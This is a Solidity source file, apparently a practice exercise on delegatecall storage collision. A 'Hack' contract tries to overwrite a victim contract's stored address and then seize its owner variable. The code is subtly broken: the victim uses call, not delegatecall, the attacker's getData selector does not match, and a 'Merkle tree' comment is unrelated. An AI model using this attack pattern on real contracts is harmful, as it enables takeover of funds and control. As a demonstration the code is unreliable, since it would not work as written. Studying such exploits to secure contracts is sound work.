// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.6.0 <0.9.0;

contract Hack {
  address public otherContract;
  address public owner;

  MyContract public toHack;

  constructor(address _to) {
    toHack = MyContract(_to);
  }

  function attack() external {
    toHack.delCallgetData(uint(uint160(address(this))));
    toHack.delCallgetData(0);
  }

    function getData() external payable {
      owner = msg.sender;
    }
}

//Merkle tree
contract MyContract {
  address public otherContract;
  address public owner;
  uint public at;
  address public sender;
  uint public amount;

  constructor(address _otherContact) {
    otherContract = _otherContact;
    owner = msg.sender;
  }

  function delCallgetData(uint timestamp) external payable {
    (bool success, ) = otherContract.call(
      abi.encodeWithSelector(AnotherContract.getData.selector, timestamp)
    );

    require(success, "faild");
  }

}

contract AnotherContract {
  uint public at; 
  address public sender;
  uint public amount;

  event Receive(address sender, uint value);

  function getData(uint timestamp) external payable {
    at = timestamp;
    sender = msg.sender;
    amount = msg.value;
    emit Receive(msg.sender, msg.value);
  }
}